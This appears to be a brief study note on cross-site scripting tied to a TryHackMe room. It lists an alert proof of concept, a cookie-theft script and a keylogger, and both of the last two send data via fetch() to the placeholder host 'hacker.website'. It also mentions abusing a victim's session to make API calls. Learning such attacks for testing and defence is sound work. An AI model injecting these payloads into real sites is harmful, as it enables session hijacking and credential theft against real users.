# XSS and Javascript vulnerabilities

[![xssgi](../../../_badges/xssgi.svg)](https://tryhackme.com/room/xssgi)

<div class="row row-cols-md-2"><div>

Cross-site Scripting, most commonly called **XSS**, refer to injecting malicious JavaScript in a web application with the goal of it being executed by other users.

**The usual proof of concept**: show an alert if the script was executed.

```js
<script>alert('XSS');</script>
```

**Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold 💰, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.

```js
<script>fetch('https://hacker.website/steal?cookie=' + btoa(document.cookie));</script>
```
</div><div>

**A simple keylogger**: send each key pressed is sent to the hacker website. The script is using `btoa()` to encode in base64 the values.

```js
<script>document.onkeypress = function(e) { fetch('https://hacker.website/keylogger?key=' + btoa(e.key) )}</script>
```

<br>

**Exploit the client privileges**: when a client is logged, then can do things on the website. Sometimes, the website is using an API, and the malicious code may use the client identify to do API calls, such as resetting the password, or stuff like that.
</div></div>